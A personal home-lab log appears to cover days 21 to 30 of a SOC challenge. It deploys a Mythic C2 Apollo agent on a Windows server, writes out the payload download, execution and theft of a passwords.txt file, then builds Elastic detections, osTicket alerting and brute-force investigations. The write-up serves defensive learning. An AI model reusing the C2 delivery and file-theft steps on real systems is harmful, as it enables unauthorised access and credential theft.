I went to the **Mythic** website to explore agents compatible with **Windows** and decided to use the **Apollo** agent. In the terminal, I typed the following command to install it:

```bash
./mythic-cli install github https://github.com/MythicAgents/Apollo.git
```

After a few minutes, the **Apollo** agent appeared under my Mythic agents:
![Apollo Agent Installed](https://github.com/user-attachments/assets/2d1579be-923c-4ed0-9b36-c7f0b2346c8d)

Next, I installed the **http** profile by running:

```bash
./mythic-cli install github https://github.com/MythicC2Profiles/http
```

Once installed, I created a new payload for **Windows** in Mythic, choosing the `WindowsExe` package and including all the necessary commands. I selected the **http C2 Profile** and, for the **Callback Host**, I entered `http://[mythic server's public IP]`. After completing the setup, I generated the payload.

I copied the download link and ran the following command in my terminal to download the file:

```bash
wget https://149.28.88.178:7443/direct/download/b8f70270-2709-4ee0-819b-2420cba3e725 --no-check-certificate
```

Once downloaded, I renamed the file to `apollo.exe`, created a directory named `1`, and moved the file into that directory.

To serve the file, I used Python's built-in HTTP module with the following code:

```bash
python3 -m http.server 9999
```

On my **Windows Server**, I opened **PowerShell** and used the following command to download the **Apollo** agent:

```bash
Invoke-WebRequest -Uri http://[mythic server's IP]:9999/apollo.exe -OutFile "C:\Users\Public\Downloads\apollo.exe"
```
![File Downloaded](https://github.com/user-attachments/assets/99fd65cb-de26-4683-bc74-134078c54027)

I then executed the **Apollo** agent with:

```bash
.\apollo.exe
```

Immediately, the callback appeared in my **Mythic Agent Dashboard**:
![Callback Success](https://github.com/user-attachments/assets/e1018584-d0cd-4907-be4c-f0e18647136e)

To test the connection, I ran some commands (e.g., `whoami`, `ifconfig`) directly from the **Mythic Agent** interface, and the results were returned successfully:
![Command Results](https://github.com/user-attachments/assets/7fe560e0-b6c7-445f-ac45-414180f956ad)

Finally, I attempted to download the `passwords.txt` file from earlier using this command:

```bash
download C:\Users\Administrator\Documents\passwords.txt
```

Once the command completed, I navigated to the **Files** section in Mythic and successfully viewed the contents of `passwords.txt`:
![Passwords File Contents](https://github.com/user-attachments/assets/dc22e6c2-6d73-49ce-a5f2-173523d32dbe)

### **Day 22: Creating Mythic C2 Alert**

Today, I set up an alert in Elastic to monitor for the **Apollo** agent, which is part of my **Mythic C2** infrastructure.

#### **Step 1: Searching for `apolo.exe`**
I began by searching for the Mythic executable `apolo.exe` in Elastic. This was the file name of the agent I had deployed. To narrow down the results, I added the filter `event.code:1`, which logs process creation events and captures MD5 hashes of executables. This can help detect malicious files. 

Once I found the relevant event, I clicked on it and copied the associated hash:
![Event Hash](https://github.com/user-attachments/assets/d5ed3d55-951c-4b9b-a25f-a6efa5f95b31)

#### **Step 2: Checking the Hash with VirusTotal**
Next, I used **VirusTotal** to analyze the SHA256 hash:
```bash
SHA256=5FFAF58B7C811C6C66EEE07164B1227E1AC108BB611EB01509FEA333C538FF76
```
Since this was a newly generated Mythic agent, there were no existing matches in VirusTotal.

#### **Step 3: Creating a Query for Detection**
I created a query in Elastic to detect when a process is created (`event.code:1`) and show the **SHA256** hash of the Mythic agent:
```bash
event.code: "1" AND (winlog.event_data.Hashes: *5FFAF58B7C811C6C66EEE07164B1227E1AC108BB611EB01509FEA333C538FF76* OR winlog.event_data.OriginalFileName : "Apollo.exe")
```

#### **Step 4: Setting Up a Detection Rule**
To automate this detection, I navigated to **Security > Rules** in Elastic, clicked on **Detection Rules**, and selected **Create New Rule**. For the required fields, I filled in the following:
![Detection Rule Fields](https://github.com/user-attachments/assets/9f37b97d-1c2e-4911-83a8-dd4af61813e8)

- **Rule Name**: `Mythic C2 Apollo Agent Detected`
- **Severity**: `Critical`
- **Frequency**: Every 5 minutes with a 5-minute look-back window

I saved and enabled the rule.

#### **Step 5: Creating a Dashboard**
To enhance my monitoring capabilities, I built a dashboard that looks for the following:

1. **Process Creation via PowerShell, CMD, or rundll32:**
```bash
event.code: "1" AND event.provider : "Microsoft-Windows-Sysmon" AND (powershell OR cmd OR rundll32)
```
![Dashboard - Process Creation](https://github.com/user-attachments/assets/8aa9f47a-8126-4465-9934-360f2d2a1340)

2. **Network Connection Initiation:**
```bash
event.code: "3" AND event.provider : "Microsoft-Windows-Sysmon" AND winlog.event_data.Initiated : "true"
```
![Dashboard - Network Connection](https://github.com/user-attachments/assets/aff27b52-48bd-4808-a81b-bf6bfdbce85d)

3. **Windows Defender Alerts:**
```bash
event.code: "5001" AND event.provider : "Microsoft-Windows-Windows Defender"
```
![Dashboard - Defender Alerts](https://github.com/user-attachments/assets/24928035-0f90-42ad-adbe-f4c7977d7723)

### **Day 23: What is a Ticketing System?**

A **Ticketing System** is a tool that manages and tracks various types of requests or issues within an organization. These requests, known as **tickets**, can represent:

- Alerts
- Customer complaints
- Troubleshooting requests
- Any service or support-related request

#### **Popular Ticketing Systems**
Some widely used ticketing systems include:
- **Jira**
- **Zendesk**
- **ServiceNow**
- **OSTicket**

### **Day 24: OSTicket Setup**
I deployed a new server with Windows Standard 2022 as the image and connected it to the VPC.
I added the `SSH-only` firewall from earlier.
I used RDP to access the server. I opened the web browser and looked up `xampp`, clicked on the first link and then downloaded the 8.2.12 version for Windows.
After it was installed, I went to where it was located and  I clicked on properties, and then edit
![image](https://github.com/user-attachments/assets/5e9b1767-e181-4945-99e9-f40ce16b1eed)
I changed the `apache_domainname` to my public ip address and saved it.
Next I went to the `phpMyAdmin` directory and configured the `config.inc.php` and changed the local host server to my public ip address, and then saved it.
Next I wnt to Windows Defender Firewall and created a new rule to allow inbound connections to port 80 and 443.
I went to the xampp control panel and started the Apache, and MySQL service.
I tried to acces PhpMyAdmin and got an `access denied` error page
![image](https://github.com/user-attachments/assets/a3fd9540-9be9-4948-a112-cc9058449f5d)
I changed the config.inc.php` server host back to local host: `127.0.0.1` and then tried to connect to PhpMyAdmin again and this time it was successful.
I clicked on User accounts and then clicked on the root username with localhost as the hostname. I clicked on login information changed the Host name to use my public ip address and changed the password to `Winter2024!`
I went to the config.inc file and then changed the localhost agian to my public ip address, and also changed the password to `Winter2024!`
I went to the xampp control panel and clicked on `Admin` for Apache,and then selected phpMyAdmin and got the error `Access denied for user 'pma'@'OSTicket'. 
So I clicked on User accounts and then edited the pma username 's login information to have my public ip adddress as the hostname, and also changed the password. I went back to the `cofig.nic` file and changed the password under pma.
I saved it and opened the Admin for Apache again, and this time I didn't get an error when I selected phpMyAdmin.
Next step is to install OsTicket. I opened a new tab and searched download OsTicket and selected Self-Hosted. I downloaded the free Open Source version.
Once it was downloaded I extracted it, and now saw two different files. I copied the files into a new folder I named OsTicket under: `C:\xampp\htdocs`
Iopened my browser aand serached up: [mypublicip/osticket/upload]
![image](https://github.com/user-attachments/assets/8ab01592-aef1-4712-9cf0-50da2b4e38ca)
OsTicket asked me to `Rename the sample file include/ost-sampleconfig.php to ost-config.php and click continue below` 
I went to: `C:\xampp\htdocs\osticket\upload\include` and renamed the file, and then went back to OsTicket and clicked continue. Next, I enterd basic installation information. In the Database settigns I created a new MySQL Database and named it Soc-Lab-DB and changed the Hostname to my public ip address.
I cliked on continue and got the error:`This page isn’t working right now   [My public ip] can't currently handle this request.`
I realized I needed to  create the database first, in phpMyAdmin. I created the database and updated the priviliges for the root account. I entered the basic installation information agiain and it succesful.
![image](https://github.com/user-attachments/assets/c5766540-b369-415f-878d-2e858b8cc777`
I opened up PowerShell with admin privileges, and navigated to: `cd C:\xampp\htdocs\osticket\upload\include` and then typed in the command: ` icacls .\ost-config.php /reset`

### **Day 25: OSTicket + ELK Integration**
I wnet to OSTicket and clicked on `Agent Panel` and then navigated to the Manage section. Clicked on API and then `Add New API Key`. Since my OSTicket and ELK server were on the same VPC, I used the private IP address. For the services I checked `Can Create Tickets`.
I went to elastic and clicked on , and under Alerts and Insights I clicked on connectors. By default I couldn't use API keys, so I had to start a free 30-day subscription on Elastic.
I chose `Webhook` as the connector
![image](https://github.com/user-attachments/assets/4c01e77f-b429-4b10-9436-a237dbe9fd0d)
I selected Add HTTTP header and for the Key I put `X-API-key` and for the value I put in the API Key I generated form OSTicket.
I went to the following link and copied the XML Payload Example: `https://github.com/osTicket/osTicket/blob/develop/setup/doc/api/tickets.md`
I pasted the code into the Test section and clicked on run and got the error: `Test failed to run`
After troubleshooting I realized that the OSTicket server wasan't showing the private VPC address. SO I went to network adapter setings and changed the Instance's 0 AUtoconfiguration IPv4 Address to the VPC private IP address.
![image](https://github.com/user-attachments/assets/e47bbe24-67d6-4b84-93b9-c8e5dc4c6dc1)
I also went back to my connector configuration and changed the IP address from my public ip address to the private VPC address
![image](https://github.com/user-attachments/assets/3a102e59-847d-4aa5-ac12-d1400d8a155a)
And now when I reran the test, it was succesful
I went to the OSTicket website and under Tickets the ticket I just created showed up
![image](https://github.com/user-attachments/assets/dce52186-761e-40ff-959d-4c62e4f41f4b)

### **Day 26: Investigating SSH Brute Force Attack**
I went to elastic and under security I selected alerts. I was surprised to see that I had 119 alerts just in the past 24hrs!
![image](https://github.com/user-attachments/assets/60807cb4-083b-4d93-99cb-bd3f99c76e3e)
When investigating Brute Force Attacks I will be looking for: `Is the IP known to perform brute force activities? Are any other users affected by this IP?  Were any of them succesful?`
I went to `Abuseipdp.com` and looked up one of the ip addrresses that generated an alert: `	221.11.25.218`.
I found out that the ip was reported 331 times and that it was originated from China
<img width="1409" alt="image" src="https://github.com/user-attachments/assets/fc5eaff5-b807-4731-8889-aea66da42750">
The IP was reported by to have perfome Brute-Force attacks by alot of people from diffrent countries.
I was looked up the ip address on `greynoise.io` which also reported that it was malicious and I also learned that the IP  is a ZMap cllinet.
<img width="1434" alt="image" src="https://github.com/user-attachments/assets/72fcacfb-d290-4452-a29d-24605fc9bdeb">
Next I looked to see if any other users were affected by the same ip, and saw that 6  users were affected by the IP. 
I then looked if any of the attempts were succesful - None of them were successful in the last 30days. If it was succesful I would want to know what activities did they perform after logging in.
Under security I clicked on rules and then `Detectioon rules(SIEM)`, and then clicked on the SSH brute force attempt rule. I clicked on edit rule settings, and then under actions I clicked on Webhook. `OSTicket` showed up automatically and I edited it the action frequency to for each alert per rule run.
For the body, I copied the XML payload example on OSTicket's github and then removed the attatchments and IP and only left the message.
<img width="797" alt="image" src="https://github.com/user-attachments/assets/45a7a7d4-b1ca-4108-8981-876cc794979c">
I logged into OSTicket and there were alot of `SSH Brute Force Attempt` tickets generated
<img width="1053" alt="image" src="https://github.com/user-attachments/assets/2db9b5e3-b1bf-45fa-9353-63a59d15fa96">
I went back to elastic and under my rule I changed the code to add`context.rule.investigation_fields`

I SSHed into the elastic terminal and typed in the command: `nano /etc/kibana/kibana.yml` then edited the `service.publicBaseUrl:` to `http://[elastic server's public ip:5601`
I went back to my elastic rules and under the code i added: `Link:{{rule.url}}` so that it would generate a link in OSTicket that would lead me to kibana.
I went to OSTIcket, clicked on the newest link and assigned it to myself. I also closed the ticket when I was done working on it.

### **Day 27: Investigating RDP Brute Force Attack**
 I went to elastic and under security I clicked on alerts, and then I selected `RDP Brute Force Attacks` and clicked on edit rule setting and under actions clicked on Webhooks. I copied the same code from the SSH Brute Force Attack into the body.Next I went to alerts, and clicled on the first alert under the `RDP Brute Force Attacks` . I copied and pasted the ip address into `AbuseIPDB` and found out that it was from Thailand and it had been reported 74 times. 
<img width="1352" alt="image" src="https://github.com/user-attachments/assets/7c52c275-fe70-47d9-bcb7-aad69bb8a716">
Next I put the same ip into `greynoise.io` whic reported that it has identified scanning from that IP, howeverit couldn,t verify its intent.
<img width="1072" alt="image" src="https://github.com/user-attachments/assets/4c83986e-cb0c-4ffa-a797-b43251299148">
<img width="1415" alt="image" src="https://github.com/user-attachments/assets/ed6ac6c1-f9ab-47b8-b481-8eca3367226c">
I checked to see if the ip affected any other users, but it had only tried to bruteforce the Administrator account. I checked to see if any of the attempts were succesful by adding `event.code: 4624` to the query, and there were no results matching my query meaning there wasn't any successful Brute Force Attacks.

### **Day 28: Investigating Mythic Agent**
I went to elastic and clicked on Discover,and set the calendar to the last 30 days. We're going to cheat because we alredy know my C2 agent was named `apolo.exe`. 
If I had no idea what the name of the C2 agent was, these are the steps I would take:
One way would be through network telemtry since an existing C2 session would have alot of back and forth traffic, meaning they would be alot of files transferred.
You can use a tool such as RITA which would helo you detect C2 traffic.
Another way is by looking at process creations and couple that with network creations. with sysmon network creations are event id 3. I would look for rundll32 since it used by alot of malware.
Under my proces Initated Netwrok connections in m `Mythic Suspicious Activities` dashboard I saw suspicious executable.
<img width="1504" alt="image" src="https://github.com/user-attachments/assets/c772096b-3986-46f0-8ed3-def8a69e40db">
Even if the executable wasn't named `apolo.exe`, I would still question it because why is an executable in the Downloads folder trying to iniated a connection using port 80.









### **Day 29-30: Elastic Defend Setup**
Elastic has its own EDR called Elastic Defend.
In elastic I clicked on Integrations under Mangement, and then clicked on Elastic Defend. I named it and put a description. For the configurations I selected Traditional Endpoints,and selected Complete EDR. I added the integration on the Windows Server's policy. I clicked on save and continue and then save and deploy changes. 
Once it was done, I went to Manage under Security, then clicked on Endpoints.











